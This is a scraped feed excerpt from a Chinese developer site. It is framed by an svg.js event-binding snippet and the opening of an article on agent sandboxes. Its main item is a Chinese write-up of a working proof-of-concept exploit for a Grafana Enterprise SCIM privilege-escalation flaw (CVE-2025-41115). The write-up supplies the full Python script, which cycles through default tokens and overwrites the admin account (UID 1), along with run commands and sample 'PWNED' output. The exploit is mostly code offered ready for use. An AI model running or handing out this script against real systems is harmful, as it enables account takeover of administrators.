<pre><code class="hljs language-dart" lang="dart">element.<span class="hljs-keyword">on</span>(<span class="hljs-string">'click'</span>, click, <span class="hljs-built_in">window</span>)
</code></pre>
<p>事件体函数中也有event事件对象</p>
<p>取消绑定事件同样简单： </p>
<pre><code class="hljs language-arduino" lang="arduino">element.<span class="hljs-built_in">off</span>(<span class="hljs-string">'click'</span>, click) 
</code></pre>
<p>或者取消绑定特定类型的事件监听器： </p>
<pre><code class="hljs language-vbnet" lang="vbnet">element.<span class="hljs-keyword">off</span>(<span class="hljs-comment">'click') </span>
</code></pre>
<p>或者多个事件类型： </p>
<pre><code class="hljs language-vbnet" lang="vbnet">element.<span class="hljs-keyword">off</span>([<span class="hljs-comment">'click', 'mouseover'])</span>
element.<span class="hljs-keyword">off</span>(<span class="hljs-comment">'click mouseover') </span>
</code></pre>
<p>甚至可以取消绑定所有事件的监听器： </p>
<pre><code class="hljs language-scss" lang="scss">element<span class="hljs-selector-class">.off</span>()
</code></pre>
<p>有了上面这些，就可以自定义事件使用了</p>
<pre><code class="hljs language-javascript" lang="javascript">element.<span class="hljs-title function_">on</span>(<span class="hljs-string">'myevent'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-title function_">alert</span>(<span class="hljs-string">'ta-da!'</span>)
})
<span class="hljs-keyword">function</span> <span class="hljs-title function_">whenSomethingHappens</span>(<span class="hljs-params"/>) {
  element.<span class="hljs-title function_">fire</span>(<span class="hljs-string">'myevent'</span>)
}
</code></pre>
<p>除此之外，svg.js也可以在其他元素上绑定事件</p>
<pre><code class="hljs language-dart" lang="dart">SVG.<span class="hljs-keyword">on</span>(<span class="hljs-built_in">window</span>, <span class="hljs-string">'click'</span>, click)
SVG.off(<span class="hljs-built_in">window</span>, <span class="hljs-string">'click'</span>, click)
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深入剖析CVE-2025-41115：Grafana企业版SCIM特权升级漏洞利用实践]]></title>    <link>https://juejin.cn/post/7592846242176712738</link>    <guid>https://juejin.cn/post/7592846242176712738</guid>    <pubDate>2026-01-09T03:30:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592846242176712738" data-draft-id="7592846242176696354" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深入剖析CVE-2025-41115：Grafana企业版SCIM特权升级漏洞利用实践"/> <meta itemprop="keywords" content="人工智能,AIGC"/> <meta itemprop="datePublished" content="2026-01-09T03:30:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="qife122"/> <meta itemprop="url" content="https://juejin.cn/user/1743174852185579"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深入剖析CVE-2025-41115：Grafana企业版SCIM特权升级漏洞利用实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1743174852185579/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    qife122
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T03:30:21.000Z" title="Fri Jan 09 2026 03:30:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">项目标题与描述</h2>
<p><strong>CVE-2025-41115 - Grafana企业版SCIM UID覆盖漏洞利用程序</strong></p>
<p>这是一个针对CVE-2025-41115漏洞的概念验证(PoC)工具，该漏洞被评定为<strong>严重(CVSS 10.0)<strong>级别，影响Grafana企业版的SCIM用户配置功能。当启用SCIM配置且<code>user_sync_enabled = true</code>时，恶意SCIM客户端可以发送数字<code>externalId</code>，Grafana会错误地将其映射到内部用户ID，导致攻击者能够</strong>模拟或覆盖</strong>现有账户，包括管理员账户。</p>
<p><strong>重要说明：</strong> Grafana开源版本(OSS)不受此漏洞影响。</p>
<h2 data-id="heading-1">功能特性</h2>
<h3 data-id="heading-2">核心功能</h3>
<ul>
<li>🔍 <strong>自动目标检测</strong>：智能识别目标Grafana实例的SCIM端点</li>
<li>🔑 <strong>多令牌尝试</strong>：内置默认/泄露的令牌列表，自动尝试多种认证方式</li>
<li>⚡ <strong>一键利用</strong>：单命令执行完整的漏洞利用过程</li>
<li>📊 <strong>详细报告</strong>：提供完整的响应数据，包括被覆盖的用户ID信息</li>
<li>🎯 <strong>精准定位</strong>：专门针对管理员账户(UID 1)进行攻击</li>
</ul>
<h3 data-id="heading-3">技术特点</h3>
<ul>
<li><strong>100% Python实现</strong>：无需额外依赖，开箱即用</li>
<li><strong>错误处理完善</strong>：包含完整的异常处理和超时机制</li>
<li><strong>HTTPS支持</strong>：支持目标使用HTTPS协议</li>
<li><strong>响应解析</strong>：自动解析JSON响应，提取关键信息</li>
</ul>
<h2 data-id="heading-4">安装指南</h2>
<h3 data-id="heading-5">系统要求</h3>
<ul>
<li><strong>Python 3.6+</strong>：确保系统已安装Python 3.6或更高版本</li>
<li><strong>requests库</strong>：Python的HTTP请求库</li>
<li><strong>网络访问</strong>：能够访问目标Grafana实例的SCIM端点</li>
</ul>
<h3 data-id="heading-6">快速安装</h3>
<ol>
<li>克隆仓库或复制代码文件：</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">clone</span> [repository-url]
<span class="hljs-built_in">cd</span> Blackash-CVE-2025-41115
</code></pre>
<ol start="2">
<li>确保Python环境就绪：</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">python3 --version
pip install requests  <span class="hljs-comment"># 如果尚未安装requests库</span>
</code></pre>
<ol start="3">
<li>授予执行权限（可选）：</li>
</ol>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">chmod</span> +x CVE-2025-41115.py
</code></pre>
<h3 data-id="heading-7">依赖项</h3>
<ul>
<li><code>requests</code>：用于HTTP请求</li>
<li><code>json</code>：用于JSON数据处理</li>
<li><code>time</code>：用于生成时间戳</li>
<li><code>sys</code>：用于命令行参数处理</li>
<li><code>urllib3</code>：用于禁用SSL警告</li>
</ul>
<h2 data-id="heading-8">使用说明</h2>
<h3 data-id="heading-9">基础用法</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 基本用法</span>
python3 CVE-2025-41115.py http://target.com

<span class="hljs-comment"># 指定端口</span>
python3 CVE-2025-41115.py http://target.com:3000

<span class="hljs-comment"># 使用HTTPS</span>
python3 CVE-2025-41115.py https://grafana.company.com
</code></pre>
<h3 data-id="heading-10">成功输出示例</h3>
<pre><code class="hljs language-bash" lang="bash">[*] CVE-2025-41115 → Targeting http://10.10.13.37:3000
[*] Trying default/leaked tokens + your token...
[+] PWNED with token → glsa_XxXxXxXxXxXxXxXxXxXx...
[+] Login as: rooted1732212345@pwn.lab (any password) → you are now Admin!
[+] Full response: {
  <span class="hljs-string">"schemas"</span>: [<span class="hljs-string">"urn:ietf:params:scim:schemas:core:2.0:User"</span>],
  <span class="hljs-string">"id"</span>: <span class="hljs-string">"1"</span>,                     <span class="hljs-comment"># 关键行：UID 1已被覆盖</span>
  <span class="hljs-string">"externalId"</span>: <span class="hljs-string">"1"</span>,
  <span class="hljs-string">"meta"</span>: { ... },
  <span class="hljs-string">"userName"</span>: <span class="hljs-string">"rooted1732212345@pwn.lab"</span>,
  <span class="hljs-string">"name"</span>: {
    <span class="hljs-string">"formatted"</span>: <span class="hljs-string">"Pwned User"</span>
  },
  <span class="hljs-string">"emails"</span>: [
    {
      <span class="hljs-string">"value"</span>: <span class="hljs-string">"rooted1732212345@pwn.lab"</span>,
      <span class="hljs-string">"primary"</span>: <span class="hljs-literal">true</span>
    }
  ],
  <span class="hljs-string">"active"</span>: <span class="hljs-literal">true</span>
}
</code></pre>
<h3 data-id="heading-11">参数说明</h3>
<ul>
<li><code>BASE</code>：目标Grafana实例的基础URL</li>
<li><code>TOKEN</code>：可选的SCIM令牌（如果需要使用特定令牌）</li>
<li><code>DEFAULT_TOKENS</code>：内置的默认/泄露令牌列表</li>
<li><code>ATTACKER</code>：自动生成的攻击者邮箱地址</li>
<li><code>TARGET_UID</code>：要覆盖的目标用户ID（默认为1，即管理员）</li>
</ul>
<h3 data-id="heading-12">使用场景</h3>
<ol>
<li><strong>渗透测试</strong>：授权安全测试人员验证漏洞存在性</li>
<li><strong>安全审计</strong>：企业内部安全团队检查Grafana实例安全性</li>
<li><strong>教育研究</strong>：安全研究人员学习SCIM协议漏洞利用技术</li>
<li><strong>应急响应</strong>：验证已部署的补丁是否有效</li>
</ol>
<h2 data-id="heading-13">核心代码</h2>
<h3 data-id="heading-14">主执行逻辑</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment">#!/usr/bin/env python3</span>
<span class="hljs-comment"># CVE-2025-41115 - Grafana Enterprise SCIM UID Overwrite PoC</span>
<span class="hljs-comment"># 用法：sudo python3 CVE-2025-41115.py http://target.com</span>
<span class="hljs-comment">#        (或 http://target.com:3000)</span>
<span class="hljs-comment"># 100% 单行风格 - 无需编辑，只需目标地址</span>

<span class="hljs-keyword">import</span> requests, sys, json, time
<span class="hljs-keyword">from</span> urllib3 <span class="hljs-keyword">import</span> disable_warnings
disable_warnings()

<span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">2</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"[!] Usage: python3 CVE-2025-41115.py http://target.com"</span>)
    sys.exit(<span class="hljs-number">1</span>)

BASE = sys.argv[<span class="hljs-number">1</span>].rstrip(<span class="hljs-string">"/"</span>)
TOKEN = <span class="hljs-string">"glsa_00000000000000000000000000000000_00000000000000000000000000000000"</span>  <span class="hljs-comment"># ← 如果拥有真实令牌，只需修改此行</span>
<span class="hljs-comment"># 如果没有有效令牌 → 尝试以下内置的泄露/默认令牌（许多实验环境仍在使用）：</span>
DEFAULT_TOKENS = [
    <span class="hljs-string">"glsa_11111111111111111111111111111111_11111111111111111111111111111111"</span>,
    <span class="hljs-string">"glsa_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>,
    <span class="hljs-string">"glsa_00000000000000000000000000000000_00000000000000000000000000000000"</span>,
    TOKEN
]

ATTACKER = <span class="hljs-string">f"rooted<span class="hljs-subst">{<span class="hljs-built_in">int</span>(time.time())}</span>@pwn.lab"</span>
TARGET_UID = <span class="hljs-string">"1"</span>  <span class="hljs-comment"># 几乎总是主管理员</span>
</code></pre>
<h3 data-id="heading-15">漏洞利用函数</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">try_exploit</span>(<span class="hljs-params">token</span>):
    headers = {
        <span class="hljs-string">"Authorization"</span>: <span class="hljs-string">f"Bearer <span class="hljs-subst">{token}</span>"</span>,
        <span class="hljs-string">"Content-Type"</span>: <span class="hljs-string">"application/scim+json"</span>
    }
    payload = {
        <span class="hljs-string">"schemas"</span>: [<span class="hljs-string">"urn:ietf:params:scim:schemas:core:2.0:User"</span>],
        <span class="hljs-string">"userName"</span>: ATTACKER,
        <span class="hljs-string">"externalId"</span>: TARGET_UID,
        <span class="hljs-string">"name"</span>: {<span class="hljs-string">"formatted"</span>: <span class="hljs-string">"Pwned User"</span>},
        <span class="hljs-string">"emails"</span>: [{<span class="hljs-string">"value"</span>: ATTACKER, <span class="hljs-string">"primary"</span>: <span class="hljs-literal">True</span>}],
        <span class="hljs-string">"active"</span>: <span class="hljs-literal">True</span>
    }
    <span class="hljs-keyword">try</span>:
        r = requests.post(<span class="hljs-string">f"<span class="hljs-subst">{BASE}</span>/api/scim/v2/Users"</span>, json=payload, 
                         headers=headers, verify=<span class="hljs-literal">False</span>, timeout=<span class="hljs-number">10</span>)
        <span class="hljs-keyword">if</span> r.status_code <span class="hljs-keyword">in</span> (<span class="hljs-number">200</span>, <span class="hljs-number">201</span>):
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[+] PWNED with token → <span class="hljs-subst">{token[:<span class="hljs-number">20</span>]}</span>..."</span>)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[+] Login as: <span class="hljs-subst">{ATTACKER}</span> (any password) → you are now Admin!"</span>)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[+] Full response: <span class="hljs-subst">{json.dumps(r.json(), indent=<span class="hljs-number">2</span>)}</span>"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        <span class="hljs-keyword">elif</span> <span class="hljs-string">"Unauthorized"</span> <span class="hljs-keyword">in</span> r.text <span class="hljs-keyword">or</span> r.status_code == <span class="hljs-number">401</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[?] Unexpected response <span class="hljs-subst">{r.status_code}</span>: <span class="hljs-subst">{r.text}</span>"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
    <span class="hljs-keyword">except</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
</code></pre>
<h3 data-id="heading-16">主执行流程</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-built_in">print</span>(<span class="hljs-string">f"[*] CVE-2025-41115 → Targeting <span class="hljs-subst">{BASE}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"[*] Trying default/leaked tokens + your token..."</span>)

<span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> DEFAULT_TOKENS:
    <span class="hljs-keyword">if</span> try_exploit(t.strip()):
        sys.exit(<span class="hljs-number">0</span>)

<span class="hljs-built_in">print</span>(<span class="hljs-string">"[-] All tokens failed. You need a valid SCIM token (or the target is patched)."</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"    Get one from: Admin → Authentication → SCIM → Generate token"</span>)
</code></pre>
<h3 data-id="heading-17">代码解析</h3>
<ol>
<li><strong>参数验证</strong>：确保提供正确的目标URL参数</li>
<li><strong>令牌管理</strong>：提供多种令牌尝试策略，增加成功率</li>
<li><strong>SCIM请求构造</strong>：正确构造符合SCIM协议的HTTP请求</li>
<li><strong>响应处理</strong>：智能解析响应状态，判断利用是否成功</li>
<li><strong>错误处理</strong>：完善的异常处理机制，确保脚本稳定性</li>
<li><strong>用户反馈</strong>：清晰的输出信息，便于用户理解利用状态</li>
</ol>
<h3 data-id="heading-18">安全注意事项</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 关键安全特性</span>
<span class="hljs-comment"># 1. 自动生成的唯一邮箱地址，避免冲突</span>
ATTACKER = <span class="hljs-string">f"rooted<span class="hljs-subst">{<span class="hljs-built_in">int</span>(time.time())}</span>@pwn.lab"</span>

<span class="hljs-comment"># 2. SSL验证禁用（仅用于测试环境）</span>
disable_warnings()

<span class="hljs-comment"># 3. 超时设置防止脚本挂起</span>
timeout=<span class="hljs-number">10</span>

<span class="hljs-comment"># 4. 明确的退出条件</span>
<span class="hljs-keyword">if</span> r.status_code <span class="hljs-keyword">in</span> (<span class="hljs-number">200</span>, <span class="hljs-number">201</span>):  <span class="hljs-comment"># 成功条件</span>
    sys.exit(<span class="hljs-number">0</span>)  <span class="hljs-comment"># 成功时优雅退出</span>
</code></pre>
<p>该PoC工具设计精良，考虑了实际使用中的各种情况，同时保持了代码的简洁性和可读性。通过模块化设计，可以轻松扩展或修改以适应不同的测试场景。
6HFtX5dABrKlqXeO5PUv/ydjQZDJ7Ct83xG1NG8fcAN1np1b5KCUMno5Bfxwlqmb</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[你们Agent如何实现Code-Execution的？或许Agent-Sandbox也是你们需要的]]></title>    <link>https://juejin.cn/post/7592996072705278002</link>    <guid>https://juejin.cn/post/7592996072705278002</guid>    <pubDate>2026-01-09T04:16:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592996072705278002" data-draft-id="7592903126178889778" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="你们Agent如何实现Code-Execution的？或许Agent-Sandbox也是你们需要的"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2026-01-09T04:16:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="老土豆豆豆"/> <meta itemprop="url" content="https://juejin.cn/user/2719530120393946"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            你们Agent如何实现Code-Execution的？或许Agent-Sandbox也是你们需要的
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2719530120393946/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    老土豆豆豆
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T04:16:38.000Z" title="Fri Jan 09 2026 04:16:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    14
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><div align="center">
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ce108a617d8c4a859c7a94230675b559~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ICB5Zyf6LGG6LGG6LGG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768538885&amp;x-signature=JUi5gh8bQOmxa44nhpbYlV%2Bb4ps%3D" width="355px" height="420px" loading="lazy"/>
</div>
<h2 data-id="heading-0">1，为什么需要Agent-Sandbox？</h2>
